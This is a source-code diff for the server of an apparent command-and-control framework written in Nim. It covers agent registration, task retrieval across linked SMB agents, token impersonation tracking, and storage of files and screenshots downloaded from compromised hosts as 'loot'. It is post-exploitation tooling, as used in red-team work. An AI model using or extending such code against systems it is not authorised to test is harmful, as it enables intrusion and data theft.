@@ -4,46 +4,42 @@ import std/[dirs, paths]
 import ../globals
 import ../db/database
 import ../core/[packer, logger, websocket]
-import ../../common/[types, utils, serialize]
+import ../../common/[utils, serialize]
+import ../../types/[common, server, protocol, event]
 
 #[
   Agent API
   Functions relevant for dealing with the agent API, such as registering new agents, querying tasks and posting results
 ]#
-proc register*(registrationData: seq[byte], remoteAddress: string): bool = 
-
-    # The following line is required to be able to use the `cq` global variable for console output
+proc register*(registrationData: seq[byte], remoteAddress: string): bool {.discardable.} = 
     {.cast(gcsafe).}:
-
         try:
             let agent: Agent = cq.deserializeNewAgent(registrationData, remoteAddress)
 
-            # Validate that listener exists        
             if not cq.dbListenerExists(agent.listenerId.toUpperAscii): 
-                raise newException(CatchableError, fmt"{agent.ipInternal} attempted to register to non-existent listener: {agent.listenerId}." & "\n")
+                raise newException(CatchableError, fmt"{agent.ipInternal} attempted to register to non-existent listener: {agent.listenerId}.")
 
-            # Store agent in database
-            if not cq.dbStoreAgent(agent): 
-                raise newException(CatchableError, fmt"Failed to insert agent {agent.agentId} into database." & "\n")
+            if cq.dbAgentExists(agent.agentId):
+                raise newException(CatchableError, fmt"Agent {agent.agentId} attempted to register but already exists.")
 
-            # Create log directory
+            if not cq.dbStoreAgent(agent):
+                raise newException(CatchableError, fmt"Failed to insert agent {agent.agentId} into database.")
+
             if not cq.makeAgentLogDirectory(agent.agentId):
-                raise newException(CatchableError, "Failed to create log directory.\n")
+                cq.error("Failed to create log directory.\n")
+                return false
 
             cq.agents[agent.agentId] = agent
-
-            cq.info("Agent ", fgYellow, styleBright, agent.agentId, resetStyle, " connected to listener ", fgGreen, styleBright, agent.listenerId, resetStyle, ": ", fgYellow, styleBright, fmt"{agent.username}@{agent.hostname}", "\n") 
-            
-            # Send new agent to client
-            cq.client.sendAgent(agent)
-            cq.client.sendEventlogItem(LOG_INFO_SHORT, fmt"Agent {agent.agentId} connected to listener {agent.listenerId}.")
+            cq.info("Agent ", fgYellow, styleBright, agent.agentId, resetStyle, " connected to listener ", fgGreen, styleBright, agent.listenerId, resetStyle, ": ", fgYellow, styleBright, fmt"{agent.username}@{agent.hostname}")
+            cq.sendAgent(agent)
+            cq.sendEventlogItem(LOG_INFO_SHORT, fmt"Agent {agent.agentId} connected to listener {agent.listenerId}.")
             return true
         
         except CatchableError as err:
             cq.error(err.msg) 
             return false
 
-proc getTasks*(heartbeat: seq[byte]): tuple[agentId: string, tasks: seq[seq[byte]]] = 
+proc getTasks*(heartbeat: seq[byte]): Table[string, seq[seq[byte]]] = 
 
     {.cast(gcsafe).}:
 
@@ -53,27 +49,42 @@ proc getTasks*(heartbeat: seq[byte]): tuple[agentId: string, tasks: seq[seq[byte
             agentId = Uuid.toString(request.header.agentId)
             listenerId = Uuid.toString(request.listenerId)
             timestamp = request.timestamp
-
-        var tasks: seq[seq[byte]]
+        var tasks = initTable[string, seq[seq[byte]]]()
 
         # Check if listener exists
         if not cq.dbListenerExists(listenerId): 
-            raise newException(ValueError, fmt"Task-retrieval request made to non-existent listener: {listenerId}." & "\n")
+            raise newException(ValueError, fmt"Task-retrieval request made to non-existent listener: {listenerId}.")
 
         # Check if agent exists
         if not cq.dbAgentExists(agentId): 
-            raise newException(ValueError, fmt"Task-retrieval request made to non-existent agent: {agentId}." & "\n")
+            raise newException(ValueError, fmt"Task-retrieval request made to non-existent agent: {agentId}.")
+
+        if not cq.agents.hasKey(agentId):
+            return tasks
 
         # Update the last check-in date for the accessed agent
         cq.agents[agentId].latestCheckin = cast[int64](timestamp)
-        cq.client.sendAgentCheckin(agentId)
-
-        # Return tasks
-        for task in cq.agents[agentId].tasks.mitems: # Iterate over agents as mutable items in order to modify GMAC tag
-            let taskData = cq.serializeTask(task)
-            tasks.add(taskData)
+        cq.sendAgentCheckin(agentId)
         
-        return (agentId, tasks)
+        proc collectTasks(agentId: string)=
+            var temp = newSeq[seq[byte]]()
+            for task in cq.agents[agentId].tasks.mitems:
+                let taskData = cq.serializeTask(task)
+                temp.add(taskData)
+
+            if temp.len() > 0:
+                tasks[agentId] = temp
+
+            # Recursively collect tasks for linked agents
+            for linkedAgentId in cq.agents[agentId].links:
+                cq.sendAgentCheckin(linkedAgentId)
+                collectTasks(linkedAgentId) 
+
+            # Clear task queue
+            cq.agents[agentId].tasks = @[]
+
+        collectTasks(agentId)        
+        return tasks
 
 proc handleResult*(resultData: seq[byte]) = 
 
@@ -84,14 +95,16 @@ proc handleResult*(resultData: seq[byte]) =
                 taskResult = cq.deserializeTaskResult(resultData) 
                 taskId = Uuid.toString(taskResult.taskId)
                 agentId = Uuid.toString(taskResult.header.agentId)
+            
+            let silent = (taskResult.header.flags and cast[uint16](FLAG_SILENT)) != 0
 
-            cq.client.sendConsoleItem(agentId, LOG_INFO, fmt"{$resultData.len} bytes received.")
+            cq.sendConsoleItem(agentId, LOG_INFO, fmt"{$resultData.len} bytes received.", silent)
             cq.info(fmt"{$resultData.len} bytes received.")
             
             # Update task queue to include all tasks, except the one that was just completed
             case cast[StatusType](taskResult.status):
             of STATUS_COMPLETED:
-                cq.client.sendConsoleItem(agentId, LOG_SUCCESS, fmt"Task {taskId} completed.")
+                cq.sendConsoleItem(agentId, LOG_SUCCESS, fmt"Task {taskId} completed.", silent)
                 cq.success(fmt"Task {taskId} completed.")
                 cq.agents[agentId].tasks = cq.agents[agentId].tasks.filterIt(it.taskId != taskResult.taskId)
 
@@ -101,15 +114,18 @@ proc handleResult*(resultData: seq[byte]) =
                     let impersonationToken: string = Bytes.toString(taskResult.data).split(" ", 1)[1..^1].join(" ")[0..^2]   # Remove trailing '.' character from the domain\username string
                     if cq.dbUpdateTokenImpersonation(agentId, impersonationToken):
                         cq.agents[agentId].impersonationToken = impersonationToken
-                        cq.client.sendImpersonateToken(agentId, impersonationToken) 
+                        cq.sendImpersonateToken(agentId, impersonationToken) 
                 of CMD_REV2SELF:
                     if cq.dbUpdateTokenImpersonation(agentId, ""):
                         cq.agents[agentId].impersonationToken.setLen(0)
-                        cq.client.sendRevertToken(agentId)
-                else: discard 
+                        cq.sendRevertToken(agentId)
+                of CMD_CD, CMD_PWD: 
+                    cq.sendWorkingDirectory(agentId, Bytes.toString(taskResult.data))
+
+                else: discard
 
             of STATUS_FAILED: 
-                cq.client.sendConsoleItem(agentId, LOG_ERROR, fmt"Task {taskId} failed.")
+                cq.sendConsoleItem(agentId, LOG_ERROR, fmt"Task {taskId} failed.", silent)
                 cq.error(fmt"Task {taskId} failed.")
                 cq.agents[agentId].tasks = cq.agents[agentId].tasks.filterIt(it.taskId != taskResult.taskId)
             of STATUS_IN_PROGRESS: 
@@ -118,8 +134,8 @@ proc handleResult*(resultData: seq[byte]) =
             case cast[ResultType](taskResult.resultType):
             of RESULT_STRING:
                 if int(taskResult.length) > 0:
-                    cq.client.sendConsoleItem(agentId, LOG_INFO, "Output:") 
-                    cq.client.sendConsoleItem(agentId, LOG_OUTPUT, Bytes.toString(taskResult.data))
+                    cq.sendConsoleItem(agentId, LOG_INFO, "Output:", silent) 
+                    cq.sendConsoleItem(agentId, LOG_OUTPUT, Bytes.toString(taskResult.data), silent)
 
             of RESULT_BINARY:
                 # Write binary data to a file 
@@ -139,7 +155,7 @@ proc handleResult*(resultData: seq[byte]) =
                 let fileInfo = getFileInfo(downloadPath)
                 var lootItem = LootItem(
                     lootId: generateUuid(),
-                    itemType: parseEnum[LootItemType](($cast[CommandType](taskResult.command)).split("_")[1]), # CMD_DOWNLOAD -> DOWNLOAD, CMD_SCREENSHOT -> SCREENSHOT
+                    itemType: parseEnum[LootItemType](($cast[CommandType](taskResult.command)).toUpperAscii()), # CMD_DOWNLOAD -> DOWNLOAD, CMD_SCREENSHOT -> SCREENSHOT
                     agentId: agentId, 
                     path: downloadPath, 
                     timestamp: fileInfo.creationTime.toUnix(),
@@ -149,14 +165,43 @@ proc handleResult*(resultData: seq[byte]) =
 
                 # Send loot to client to display file/screenshot in the UI
                 discard cq.dbStoreLoot(lootItem)
-                cq.client.sendLoot(lootItem)
+                cq.sendLoot(lootItem)
 
                 cq.output(fmt"File downloaded to {downloadPath} ({$fileData.len()} bytes).", "\n")
-                cq.client.sendConsoleItem(agentId, LOG_OUTPUT, fmt"File downloaded to {downloadPath} ({$fileData.len()} bytes).")
+                cq.sendConsoleItem(agentId, LOG_OUTPUT, fmt"File downloaded to {downloadPath} ({$fileData.len()} bytes).", silent)
+            
+            of RESULT_PROCESSES: 
+                cq.sendProcessList(agentId, Bytes.toString(taskResult.data), silent)
+
+            of RESULT_DIRECTORY_LISTING: 
+                cq.sendDirectoryListing(agentId, Bytes.toString(taskResult.data), silent)
+
+            of RESULT_LINK: 
+                # When an SMB agent is linked, the registration data is sent as the task result of the 'link' command
+                # We register the newly linked agent
+                var unpacker = Unpacker.init(Bytes.toString(taskResult.data))
+                discard unpacker.getUint8()
+                let registrationBytes = string.toBytes(unpacker.getDataWithLengthPrefix())
+                
+                # Store the link between the agents
+                let agent = cq.deserializeNewAgent(registrationBytes, "")
+                cq.agents[agentId].links.add(agent.agentId)
+                if not cq.dbStoreLink(agentId, agent.agentId):
+                    raise newException(CatchableError, "Failed to store link in database.")
+
+                discard register(registrationBytes, cq.agents[agentId].ipExternal)
+
+            of RESULT_UNLINK: 
+                # Remove the link between the agents
+                let linkedAgentId = Bytes.toString(taskResult.data).toUpperAscii()
+                cq.agents[agentId].links.keepItIf(it != linkedAgentId)
+                if not cq.dbDeleteLink(agentId, linkedAgentId):
+                    raise newException(CatchableError, "Failed to delete link from database.")
+
             else: discard 
 
             # Send newline to separate commands
-            cq.client.sendConsoleItem(agentId, LOG_OUTPUT, "")
+            cq.sendConsoleItem(agentId, LOG_OUTPUT, "", silent)
             
         except CatchableError as err:
             cq.error(err.msg, "\n")  
